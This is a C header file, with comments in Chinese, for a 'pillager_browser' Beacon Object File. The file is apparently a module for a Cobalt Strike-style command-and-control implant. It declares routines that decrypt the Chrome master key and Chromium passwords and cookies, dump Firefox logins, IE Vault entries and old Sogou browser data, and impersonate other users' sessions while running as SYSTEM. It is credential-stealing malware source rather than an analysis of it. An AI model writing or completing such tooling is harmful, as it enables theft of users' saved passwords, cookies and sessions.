/* pillager_browser BOF — 浏览器全量（Chromium 系 + Firefox），输出对齐 Pillager 文本/JSON 风格 */
#pragma once
#include <windows.h>
#include "beacon.h"
#include "adaptix.h"

#define PLG_MAX_PATH 520
#define PLG_MAX_PROFILES 100
#define PLG_MAX_ROW_FIELDS 48
#define PLG_MAX_TABLE_ROWS 65536
#define PLG_MAX_MASTER 1024
#define PLG_OUT_CHUNK 32000
#define PLG_SESS_MAX 24

#define PLG_MASK_CHROMIUM 1
#define PLG_MASK_FIREFOX 2
#define PLG_MASK_IE 4
#define PLG_MASK_OLDSOGOU 8

extern HANDLE PLG_heap; /* 定义在 plg_crypto.c */

typedef struct PlgSession {
	HANDLE token;
	char user_tag[48];
	char local[PLG_MAX_PATH];
	char appdata[PLG_MAX_PATH];
} PlgSession;

#define plg_alloc(n) ((void*)KERNEL32$HeapAlloc(PLG_heap, HEAP_ZERO_MEMORY, (SIZE_T)(n)))
#define plg_free(p) do { if (p) { KERNEL32$HeapFree(PLG_heap, 0, (p)); (p) = NULL; } } while (0)

WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATAA);
WINBASEAPI BOOL WINAPI KERNEL32$FindNextFileA(HANDLE, LPWIN32_FIND_DATAA);
WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR);

WINBASEAPI BOOL WINAPI CRYPT32$CryptUnprotectData(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, PVOID, DWORD, DATA_BLOB*);

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptSetProperty(BCRYPT_ALG_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptGetProperty(BCRYPT_ALG_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDecrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);

WINBASEAPI int __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
WINBASEAPI int __cdecl MSVCRT$sprintf(char*, const char*, ...);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void*, const void*, size_t);
WINBASEAPI void *__cdecl MSVCRT$memset(void*, int, size_t);
WINBASEAPI int __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char*);
WINBASEAPI char *__cdecl MSVCRT$strcpy(char*, const char*);
WINBASEAPI char *__cdecl MSVCRT$strncpy(char*, const char*, size_t);
WINBASEAPI char *__cdecl MSVCRT$strstr(const char*, const char*);
WINBASEAPI int __cdecl MSVCRT$strcmp(const char*, const char*);
WINBASEAPI int __cdecl MSVCRT$strncmp(const char*, const char*, size_t);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char*, const char*);
WINBASEAPI char *__cdecl MSVCRT$strchr(const char*, int);
WINBASEAPI unsigned long __cdecl MSVCRT$strtoul(const char*, char**, int);

/* plg_sqlite.c */
typedef struct PlgSqlite PlgSqlite;
PlgSqlite *plg_sqlite_open(const unsigned char *data, size_t len);
void plg_sqlite_close(PlgSqlite *db);
int plg_sqlite_read_table(PlgSqlite *db, const char *table);
int plg_sqlite_row_count(PlgSqlite *db);
const char *plg_sqlite_get(PlgSqlite *db, int row, const char *field);
long long plg_sqlite_row_id(PlgSqlite *db, int row);

int plg_b64_decode(const char *in, unsigned char *out, size_t outsz, size_t *written);

/* plg_crypto.c */
int plg_read_file_a(const char *path, unsigned char **out, DWORD *outlen);
int plg_chrome_master_key(const char *local_state_path, unsigned char key32[32]);
/* decrypt chrome password/cookie blob; in_b64: sqlite stores base64 for blobs */
int plg_chrome_decrypt(const unsigned char *master32, const char *val_b64_or_null,
	const unsigned char *raw, size_t rawlen, unsigned char *out, size_t *outlen, int is_b64);

/* plg_sess.c — SYSTEM 下按 explorer 会话枚举用户 */
int plg_collect_sessions(PlgSession *out, int maxout, int *count);
void plg_session_close_all(PlgSession *sess, int n);
int plg_session_impersonate(PlgSession *s);
void plg_session_revert(void);

/* plg_chromium.c */
void plg_process_all_chromium(const char *localappdata, const char *appdata, const char *file_prefix);
/* plg_firefox.c */
void plg_process_firefox(const char *appdata, const char *file_prefix);
/* plg_ie.c — Vault + TypedURLs + 收藏夹（须在模拟用户下调用） */
void plg_ie_dump(const char *file_prefix);
/* plg_oldsogou.c — %APPDATA%\\SogouExplorer\\Webkit（旧版搜狗） */
void plg_oldsogou_dump(const char *appdata, const char *file_prefix);

/* plg_ffox_pw.c — key4.db + logins.json（无主密码） */
void plg_ffox_dump_passwords(const char *profile_dir, const char *profile_name, formatp *fmt);
